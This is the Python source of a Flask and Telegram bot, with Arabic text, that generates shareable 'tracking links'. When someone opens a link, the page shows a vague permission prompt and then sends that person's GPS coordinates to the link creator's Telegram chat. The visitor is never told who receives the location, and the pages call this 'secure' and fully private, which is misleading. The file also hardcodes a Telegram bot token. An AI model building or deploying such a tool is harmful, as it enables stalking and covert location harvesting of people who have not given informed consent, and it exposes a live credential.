"""
بوت تتبع المواقع الجغرافية - Telegram Location Tracking Bot
نسخة Polling (لا تحتاج Webhook)
مطور بواسطة: Telegram Tracking Bot
"""

from flask import Flask, request, jsonify, render_template_string
import telebot
import threading
import logging
import os
import secrets
import time
from datetime import datetime, timedelta
import json

# ========== إعدادات التطبيق ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ========== إعدادات البوت ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7628474532:AAHQMH9nJHYqB25X89kQYtE8Ms3x5e6m7TY')
bot = telebot.TeleBot(BOT_TOKEN)

# ========== إعدادات الخادم ==========
DOMAIN = os.environ.get('RENDER_DOMAIN', 'telegram-tracking-bot.onrender.com')

# ========== تخزين البيانات ==========
tracking_links = {}
user_data = {}

# ========== الصفحة الرئيسية ==========
@app.route('/')
def home():
    """الصفحة الرئيسية"""
    active_links = sum(1 for link in tracking_links.values() if link.get('active', True))
    
    return '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>📍 نظام التتبع الآمن</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                min-height: 100vh;
                padding: 20px;
            }
            
            .container {
                max-width: 800px;
                margin: 0 auto;
            }
            
            .header {
                text-align: center;
                padding: 40px 20px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 20px;
                margin-bottom: 30px;
                backdrop-filter: blur(10px);
            }
            
            .logo {
                font-size: 60px;
                margin-bottom: 20px;
            }
            
            h1 {
                font-size: 2.5em;
                margin-bottom: 10px;
            }
            
            .subtitle {
                font-size: 1.2em;
                opacity: 0.9;
                margin-bottom: 30px;
            }
            
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 15px;
                margin: 30px 0;
            }
            
            .stat-box {
                background: rgba(255, 255, 255, 0.15);
                padding: 20px;
                border-radius: 15px;
                text-align: center;
                backdrop-filter: blur(5px);
            }
            
            .stat-number {
                font-size: 1.8em;
                font-weight: bold;
                margin: 10px 0;
            }
            
            .stat-label {
                font-size: 0.9em;
                opacity: 0.8;
            }
            
            .buttons {
                display: flex;
                flex-wrap: wrap;
                gap: 15px;
                justify-content: center;
                margin: 30px 0;
            }
            
            .btn {
                padding: 15px 30px;
                background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
                color: white;
                text-decoration: none;
                border-radius: 50px;
                font-weight: bold;
                font-size: 1.1em;
                transition: all 0.3s ease;
                border: none;
                cursor: pointer;
                display: inline-block;
            }
            
            .btn:hover {
                transform: translateY(-3px);
                box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
            }
            
            .btn-secondary {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            }
            
            .footer {
                text-align: center;
                padding: 30px;
                color: rgba(255, 255, 255, 0.7);
                margin-top: 50px;
                border-top: 1px solid rgba(255, 255, 255, 0.1);
            }
            
            @media (max-width: 768px) {
                .header {
                    padding: 30px 15px;
                }
                
                h1 {
                    font-size: 2em;
                }
                
                .stats {
                    grid-template-columns: 1fr;
                }
                
                .buttons {
                    flex-direction: column;
                }
                
                .btn {
                    width: 100%;
                    text-align: center;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div class="logo">📍</div>
                <h1>نظام التتبع الآمن</h1>
                <p class="subtitle">حل متكامل لتتبع المواقع الجغرافية بكل أمان وخصوصية</p>
                
                <div class="stats">
                    <div class="stat-box">
                        <div class="stat-number">🤖</div>
                        <div class="stat-label">نشط</div>
                    </div>
                    
                    <div class="stat-box">
                        <div class="stat-number">''' + str(active_links) + '''</div>
                        <div class="stat-label">روابط نشطة</div>
                    </div>
                    
                    <div class="stat-box">
                        <div class="stat-number">''' + str(len(user_data)) + '''</div>
                        <div class="stat-label">مستخدمين</div>
                    </div>
                    
                    <div class="stat-box">
                        <div class="stat-number">24h</div>
                        <div class="stat-label">صلاحية الروابط</div>
                    </div>
                </div>
            </div>
            
            <div class="buttons">
                <a href="/health" class="btn">
                    📊 فحص حالة الخادم
                </a>
                <a href="/admin" class="btn btn-secondary">
                    🔧 لوحة التحكم
                </a>
            </div>
            
            <div style="background: rgba(255, 255, 255, 0.1); padding: 30px; border-radius: 20px; margin: 30px 0;">
                <h2 style="margin-bottom: 20px;">🚀 كيف يعمل؟</h2>
                <div style="text-align: right; padding-right: 20px;">
                    <p style="margin: 10px 0; padding: 10px; background: rgba(255, 255, 255, 0.05); border-radius: 10px;">
                        1️⃣ أرسل <strong>/newlink</strong> في البوت
                    </p>
                    <p style="margin: 10px 0; padding: 10px; background: rgba(255, 255, 255, 0.05); border-radius: 10px;">
                        2️⃣ شارك الرابط مع الشخص المطلوب
                    </p>
                    <p style="margin: 10px 0; padding: 10px; background: rgba(255, 255, 255, 0.05); border-radius: 10px;">
                        3️⃣ عند فتح الرابط، يطلب الإذن لتحديد الموقع
                    </p>
                    <p style="margin: 10px 0; padding: 10px; background: rgba(255, 255, 255, 0.05); border-radius: 10px;">
                        4️⃣ يصلك الموقع فوراً على البوت مع خريطة
                    </p>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>© 2024 نظام التتبع الآمن. جميع الحقوق محفوظة.</p>
            <p style="margin-top: 10px;">🤖 البوت يعمل بنظام Polling المستقر</p>
        </div>
        
        <script>
            // تحديث الإحصائيات كل 30 ثانية
            function updateStats() {
                fetch('/stats')
                    .then(response => response.json())
                    .then(data => {
                        document.querySelectorAll('.stat-number')[1].textContent = data.active_links;
                        document.querySelectorAll('.stat-number')[2].textContent = data.total_users;
                    });
            }
            
            // تحديث عند التحميل
            document.addEventListener('DOMContentLoaded', updateStats);
            
            // تحديث تلقائي
            setInterval(updateStats, 30000);
        </script>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    """فحص صحة الخادم"""
    try:
        active_links = sum(1 for link in tracking_links.values() if link.get('active', True))
        
        return jsonify({
            'status': 'healthy',
            'timestamp': datetime.now().isoformat(),
            'service': 'telegram-tracking-bot',
            'version': '3.0.0',
            'active_links': active_links,
            'total_users': len(user_data),
            'bot_status': 'running (polling)',
            'server': {
                'domain': DOMAIN,
                'uptime': round(time.time() - app_start_time, 2)
            }
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/stats')
def stats():
    """إحصائيات البوت"""
    active_links = sum(1 for link in tracking_links.values() if link.get('active', True))
    
    return jsonify({
        'active_links': active_links,
        'total_links': len(tracking_links),
        'total_users': len(user_data),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/admin')
def admin():
    """لوحة التحكم"""
    active_links = sum(1 for link in tracking_links.values() if link.get('active', True))
    total_tracks = sum(link.get('tracks', 0) for link in tracking_links.values())
    
    return '''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>لوحة التحكم</title>
        <style>
            body { font-family: Arial; padding: 20px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            h1 { color: #333; margin-bottom: 30px; text-align: center; }
            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 20px; margin: 30px 0; }
            .stat-box { background: #f8f9fa; padding: 20px; border-radius: 10px; text-align: center; border: 1px solid #e9ecef; }
            .stat-number { font-size: 2em; font-weight: bold; color: #007bff; margin: 10px 0; }
            .stat-label { color: #6c757d; font-size: 0.9em; }
            .btn { display: inline-block; padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; margin: 10px 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 لوحة التحكم</h1>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number">''' + str(len(tracking_links)) + '''</div>
                    <div class="stat-label">إجمالي الروابط</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">''' + str(active_links) + '''</div>
                    <div class="stat-label">روابط نشطة</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">''' + str(len(user_data)) + '''</div>
                    <div class="stat-label">مستخدمين</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">''' + str(total_tracks) + '''</div>
                    <div class="stat-label">عمليات تتبع</div>
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 30px;">
                <a href="/" class="btn">🏠 الرئيسية</a>
                <a href="/health" class="btn" style="background: #28a745;">📊 الصحة</a>
            </div>
        </div>
    </body>
    </html>
    '''

# ========== صفحة التتبع ==========
@app.route('/track/<tracking_id>')
def track_page(tracking_id):
    """صفحة طلب الموقع"""
    if tracking_id in tracking_links:
        link_info = tracking_links[tracking_id]
        
        # التحقق من الصلاحية
        if datetime.now() > link_info['expires_at']:
            link_info['active'] = False
            return '''
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>انتهت الصلاحية</title>
                <style>
                    body { font-family: Arial; text-align: center; padding: 50px; }
                    .error { color: #dc3545; font-size: 24px; }
                </style>
            </head>
            <body>
                <h1 class="error">⏰ انتهت صلاحية الرابط</h1>
                <p>رابط التتبع هذا لم يعد فعالاً</p>
                <p>يرجى طلب رابط جديد من البوت</p>
            </body>
            </html>
            ''', 410
        
        # زيادة الزيارات
        link_info['visits'] = link_info.get('visits', 0) + 1
        
        return '''
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>طلب الوصول إلى الموقع</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                
                body {
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: #333;
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    padding: 20px;
                }
                
                .container {
                    background: white;
                    border-radius: 25px;
                    padding: 40px;
                    max-width: 500px;
                    width: 100%;
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
                    text-align: center;
                }
                
                .icon {
                    font-size: 80px;
                    margin-bottom: 25px;
                    color: #667eea;
                }
                
                h1 {
                    color: #2d3748;
                    margin-bottom: 20px;
                    font-size: 28px;
                }
                
                .info-box {
                    background: #fff3cd;
                    border: 2px solid #ffc107;
                    border-radius: 15px;
                    padding: 25px;
                    margin: 25px 0;
                    text-align: right;
                }
                
                .info-box p {
                    color: #856404;
                    line-height: 1.8;
                    margin-bottom: 15px;
                    font-size: 16px;
                }
                
                .btn {
                    padding: 20px;
                    border: none;
                    border-radius: 15px;
                    cursor: pointer;
                    font-size: 18px;
                    font-weight: bold;
                    transition: all 0.3s ease;
                    width: 100%;
                    background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
                    color: white;
                    margin-top: 20px;
                }
                
                .btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="icon">📍</div>
                <h1>طلب الوصول إلى الموقع الجغرافي</h1>
                
                <div class="info-box">
                    <p>⚠️ <strong>تنبيه هام:</strong></p>
                    <p>يطلب هذا التطبيق الوصول إلى موقعك الجغرافي الحالي</p>
                    <p>🔒 سيتم استخدام معلومات موقعك للأغراض المحددة فقط</p>
                </div>
                
                <button class="btn" onclick="getLocation()">
                    ✅ موافق ومتابعة
                </button>
            </div>
            
            <script>
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            function(position) {
                                const data = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    timestamp: new Date().toISOString(),
                                    tracking_id: "''' + tracking_id + '''"
                                };
                                
                                fetch('/track', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify(data)
                                })
                                .then(response => response.json())
                                .then(result => {
                                    if (result.success) {
                                        document.body.innerHTML = `
                                            <div class="container">
                                                <div class="icon" style="color: #48bb78;">✅</div>
                                                <h1 style="color: #48bb78;">تم بنجاح!</h1>
                                                <p style="margin: 20px 0; color: #4a5568; font-size: 18px;">
                                                    شكراً لموافقتك على مشاركة الموقع
                                                </p>
                                                <p style="color: #718096;">
                                                    يمكنك إغلاق هذه الصفحة الآن
                                                </p>
                                            </div>
                                        `;
                                    } else {
                                        alert('حدث خطأ: ' + (result.error || 'غير معروف'));
                                    }
                                })
                                .catch(error => {
                                    alert('حدث خطأ في الإرسال: ' + error.message);
                                });
                            },
                            function(error) {
                                alert('فشل في الحصول على الموقع: ' + error.message);
                            }
                        );
                    } else {
                        alert("المتصفح لا يدعم تحديد الموقع الجغرافي");
                    }
                }
            </script>
        </body>
        </html>
        '''
    
    return '''
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>رابط غير صالح</title>
        <style>
            body { font-family: Arial; text-align: center; padding: 50px; }
            .error { color: #dc3545; font-size: 24px; }
        </style>
    </head>
    <body>
        <h1 class="error">❌ رابط غير صالح</h1>
        <p>رابط التتبع غير موجود</p>
        <p>يرجى التحقق من الرابط والمحاولة مرة أخرى</p>
    </body>
    </html>
    ''', 404

@app.route('/track', methods=['POST'])
def handle_track():
    """معالجة بيانات الموقع"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({'success': False, 'error': 'لم يتم توفير بيانات'}), 400
        
        tracking_id = data.get('tracking_id')
        
        if not tracking_id or tracking_id not in tracking_links:
            return jsonify({'success': False, 'error': 'كود تتبع غير صالح'}), 400
        
        link_info = tracking_links[tracking_id]
        
        # التحقق من الصلاحية
        if datetime.now() > link_info['expires_at']:
            link_info['active'] = False
            return jsonify({'success': False, 'error': 'انتهت صلاحية الرابط'}), 410
        
        # إرسال الموقع إلى البوت
        chat_id = link_info['chat_id']
        lat = data.get('latitude')
        lon = data.get('longitude')
        accuracy = data.get('accuracy', 0)
        
        maps_url = f'https://www.google.com/maps?q={lat},{lon}'
        
        message = f"""
📍 *موقع جديد!*

🆔 **الكود:** `{tracking_id}`
📍 **الإحداثيات:** `{lat}`, `{lon}`
🗺️ **الخريطة:** {maps_url}
📏 **الدقة:** {accuracy} متر
🕒 **الوقت:** {datetime.now().strftime("%Y/%m/%d %I:%M:%S %p")}

🔗 **رابط التتبع:** https://{DOMAIN}/track/{tracking_id}
        """
        
        try:
            bot.send_message(chat_id, message, parse_mode='Markdown')
            
            # إرسال الموقع كموقع فعلي
            bot.send_location(chat_id, lat, lon)
            
            # تحديث الإحصائيات
            link_info['tracks'] = link_info.get('tracks', 0) + 1
            link_info['last_track'] = datetime.now()
            
            logger.info(f"تم إرسال الموقع للبوت: {tracking_id}")
            
            return jsonify({
                'success': True,
                'message': 'تم إرسال الموقع بنجاح'
            })
            
        except Exception as e:
            logger.error(f"خطأ في إرسال للبوت: {e}")
            return jsonify({'success': False, 'error': 'فشل في إرسال للبوت'}), 500
        
    except Exception as e:
        logger.error(f"خطأ في معالجة التتبع: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ========== معالجات البوت ==========
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """بدء البوت والمساعدة"""
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    # حفظ بيانات المستخدم
    if user_id not in user_data:
        user_data[user_id] = {
            'name': user_name,
            'first_seen': datetime.now(),
            'last_active': datetime.now(),
            'total_links': 0
        }
    else:
        user_data[user_id]['last_active'] = datetime.now()
    
    welcome_msg = f"""
🎯 **مرحباً {user_name}!**

📍 **بوت تتبع المواقع الآمن**

🤖 **الأوامر المتاحة:**
/newlink - إنشاء رابط تتبع جديد
/mylinks - عرض روابطي النشطة
/reset - حذف جميع روابطي
/stats - إحصائياتي
/status - حالة البوت
/help - المساعدة

🔒 **مميزات البوت:**
• إنشاء روابط تتبع فريدة
• إشعارات فورية عند تحديد الموقع
• روابط تنتهي تلقائياً بعد 24 ساعة
• حماية خصوصية كاملة

🚀 **للبدء، أرسل:** `/newlink`

📞 **للإبلاغ عن مشكلة أو اقتراح:**
تواصل مع المطور مباشرة.
"""
    
    bot.send_message(message.chat.id, welcome_msg, parse_mode='Markdown')
    logger.info(f"مستخدم جديد: {user_name} (ID: {user_id})")

@bot.message_handler(commands=['newlink'])
def create_new_link(message):
    """إنشاء رابط تتبع جديد"""
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        # إنشاء معرف فريد
        tracking_id = secrets.token_urlsafe(16)
        
        # حفظ البيانات
        tracking_links[tracking_id] = {
            'chat_id': chat_id,
            'user_id': user_id,
            'created_at': datetime.now(),
            'expires_at': datetime.now() + timedelta(hours=24),
            'active': True,
            'visits': 0,
            'tracks': 0,
            'last_track': None
        }
        
        # تحديث بيانات المستخدم
        if user_id in user_data:
            user_data[user_id]['total_links'] = user_data[user_id].get('total_links', 0) + 1
            user_data[user_id]['last_active'] = datetime.now()
        
        # إنشاء الرابط
        tracking_url = f'https://{DOMAIN}/track/{tracking_id}'
        
        response = f"""
✅ **تم إنشاء رابط تتبع جديد!**

🔗 **الرابط:** 
`{tracking_url}`

🆔 **الكود:** `{tracking_id}`
⏰ **الصلاحية:** 24 ساعة
📊 **الحالة:** نشط 🔵

📋 **طريقة الاستخدام:**
1. شارك هذا الرابط مع الشخص المطلوب
2. عند فتح الرابط، سيطلب الإذن للوصول للموقع
3. سيصلك إشعار فوري عند تحديد الموقع

⚠️ **ملاحظات مهمة:**
• الرابط ينتهي تلقائياً بعد 24 ساعة
• يمكنك إدارة روابطك بـ `/mylinks`
• يمكنك حذف جميع روابطك بـ `/reset`

🔐 **خصوصية:**
• لا يتم تخزين أي بيانات شخصية
• الروابط مشفرة وآمنة
        """
        
        bot.send_message(chat_id, response, parse_mode='Markdown')
        logger.info(f"تم إنشاء رابط للمستخدم {user_id}: {tracking_id}")
        
    except Exception as e:
        logger.error(f"خطأ في إنشاء الرابط: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ في إنشاء الرابط. يرجى المحاولة لاحقاً.")

@bot.message_handler(commands=['mylinks'])
def show_user_links(message):
    """عرض روابط المستخدم"""
    try:
        user_id = message.from_user.id
        
        # البحث عن روابط المستخدم النشطة
        user_links = []
        for track_id, info in tracking_links.items():
            if info['user_id'] == user_id and info['active']:
                expires_in = info['expires_at'] - datetime.now()
                if expires_in.total_seconds() > 0:
                    hours_left = expires_in.total_seconds() / 3600
                    user_links.append({
                        'id': track_id,
                        'hours_left': int(hours_left),
                        'visits': info.get('visits', 0),
                        'tracks': info.get('tracks', 0)
                    })
        
        if not user_links:
            bot.send_message(
                message.chat.id,
                "📭 **لا توجد روابط نشطة حالياً**\n\nاستخدم الأمر `/newlink` لإنشاء رابط جديد.",
                parse_mode='Markdown'
            )
            return
        
        # إنشاء رسالة الروابط
        response = "🔗 **روابطك النشطة:**\n\n"
        for i, link in enumerate(user_links, 1):
            url = f'https://{DOMAIN}/track/{link["id"]}'
            response += f"**{i}. الرابط:** `{link['id'][:8]}...`\n"
            response += f"   ⏰ **متبقي:** {link['hours_left']} ساعة\n"
            response += f"   👁️ **الزيارات:** {link['visits']}\n"
            response += f"   📍 **التتبعات:** {link['tracks']}\n"
            response += f"   🔗 **الرابط:** {url}\n\n"
        
        response += f"📊 **الإجمالي:** {len(user_links)} رابط نشط\n\n"
        response += "⚠️ **ملاحظة:** الروابط تنتهي تلقائياً بعد 24 ساعة من إنشائها"
        
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"خطأ في عرض الروابط: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ في عرض الروابط.")

@bot.message_handler(commands=['reset'])
def reset_user_links(message):
    """حذف جميع روابط المستخدم"""
    try:
        user_id = message.from_user.id
        deleted_count = 0
        
        # البحث عن روابط المستخدم وحذفها
        for track_id in list(tracking_links.keys()):
            if tracking_links[track_id]['user_id'] == user_id:
                del tracking_links[track_id]
                deleted_count += 1
        
        # تحديث بيانات المستخدم
        if user_id in user_data:
            user_data[user_id]['total_links'] = 0
        
        if deleted_count > 0:
            bot.send_message(
                message.chat.id,
                f"✅ **تم الحذف بنجاح!**\n\nتم حذف **{deleted_count}** رابط تتبع.",
                parse_mode='Markdown'
            )
            logger.info(f"تم حذف {deleted_count} رابط للمستخدم {user_id}")
        else:
            bot.send_message(
                message.chat.id,
                "ℹ️ **لا توجد روابط لحذفها**\n\nلم يتم العثور على أي روابط نشطة لحسابك.",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        logger.error(f"خطأ في حذف الروابط: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ في حذف الروابط.")

@bot.message_handler(commands=['stats'])
def show_user_stats(message):
    """عرض إحصائيات المستخدم"""
    try:
        user_id = message.from_user.id
        
        if user_id in user_data:
            user_info = user_data[user_id]
            
            # حساب الروابط النشطة
            active_links = sum(1 for link in tracking_links.values() 
                              if link['user_id'] == user_id and link['active'])
            
            # حساب إجمالي التتبعات
            total_tracks = sum(link.get('tracks', 0) 
                              for link in tracking_links.values() 
                              if link['user_id'] == user_id)
            
            response = f"""
📊 **إحصائيات حسابك:**

👤 **الاسم:** {user_info.get('name', 'غير معروف')}
🆔 **المعرف:** `{user_id}`

🔗 **الروابط:**
• إجمالي الروابط: {user_info.get('total_links', 0)}
• روابط نشطة: {active_links}

📍 **التتبعات:**
• إجمالي التتبعات: {total_tracks}

📅 **النشاط:**
• أول ظهور: {user_info.get('first_seen', datetime.now()).strftime('%Y/%m/%d')}
• آخر نشاط: {user_info.get('last_active', datetime.now()).strftime('%Y/%m/%d %I:%M %p')}

🎯 **نصيحة:** استمر في إنشاء الروابط لتتبع المزيد من المواقع!
            """
        else:
            response = """
📊 **إحصائيات حسابك:**

ℹ️ **لم يتم العثور على إحصائيات لحسابك**
قد يكون هذا أول مرة تستخدم فيها البوت.

🚀 **ابدأ الآن:** أرسل `/newlink` لإنشاء أول رابط تتبع لك!
            """
        
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"خطأ في عرض الإحصائيات: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ في عرض الإحصائيات.")

@bot.message_handler(commands=['status'])
def show_bot_status(message):
    """عرض حالة البوت والخادم"""
    try:
        active_links = sum(1 for link in tracking_links.values() if link.get('active', True))
        total_tracks = sum(link.get('tracks', 0) for link in tracking_links.values())
        
        status_message = f"""
🟢 **حالة النظام:**

🤖 **البوت:** نشط وجاهز (Polling)
🌐 **الخادم:** يعمل بشكل طبيعي
🔗 **الروابط النشطة:** {active_links}
👥 **المستخدمين:** {len(user_data)}
📍 **التتبعات الناجحة:** {total_tracks}

🕒 **الوقت الحالي:** {datetime.now().strftime('%Y/%m/%d %I:%M:%S %p')}
⏰ **وقت تشغيل الخادم:** {round(time.time() - app_start_time, 2)} ثانية

🔧 **روابط مهمة:**
• [فحص الخادم](https://{DOMAIN}/health)
• [الصفحة الرئيسية](https://{DOMAIN}/)
• [لوحة التحكم](https://{DOMAIN}/admin)

💡 **نصائح:**
• البوت يعمل بنظام Polling المستقر
• للدعم الفني، تواصل مع المطور
        """
        
        bot.send_message(message.chat.id, status_message, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"خطأ في عرض الحالة: {e}")
        bot.send_message(message.chat.id, "❌ حدث خطأ في عرض حالة النظام.")

# ========== تنظيف الروابط المنتهية ==========
def cleanup_expired_links():
    """تنظيف الروابط المنتهية تلقائياً"""
    while True:
        try:
            now = datetime.now()
            expired_count = 0
            
            for track_id in list(tracking_links.keys()):
                if tracking_links[track_id]['expires_at'] < now:
                    # تحديث بيانات المستخدم
                    user_id = tracking_links[track_id]['user_id']
                    if user_id in user_data:
                        # لا نحتاج لتحديث active_links هنا
                        pass
                    
                    del tracking_links[track_id]
                    expired_count += 1
            
            if expired_count > 0:
                logger.info(f"تم تنظيف {expired_count} رابط منتهي")
            
            # الانتظار 5 دقائق قبل التنظيف التالي
            time.sleep(300)
            
        except Exception as e:
            logger.error(f"خطأ في التنظيف التلقائي: {e}")
            time.sleep(60)

# ========== تشغيل البوت ==========
def run_bot_polling():
    """تشغيل البوت باستخدام Polling"""
    logger.info("🚀 بدء تشغيل البوت باستخدام Polling...")
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"❌ خطأ في Polling: {e}")
            logger.info("⏳ إعادة المحاولة بعد 5 ثواني...")
            time.sleep(5)
            logger.info("🔄 إعادة تشغيل Polling...")

# ========== بدء التشغيل ==========
app_start_time = time.time()

if __name__ == '__main__':
    # بدء تنظيف الروابط المنتهية
    cleanup_thread = threading.Thread(target=cleanup_expired_links, daemon=True)
    cleanup_thread.start()
    
    # بدء البوت باستخدام Polling في خيط منفصل
    bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
    bot_thread.start()
    
    # تشغيل خادم Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 بدء تشغيل خادم Flask على المنفذ {port}")
    logger.info(f"📡 البوت يعمل على: https://{DOMAIN}")
    logger.info("✅ النظام جاهز للعمل!")
    
    app.run(host='0.0.0.0', port=port, debug=False)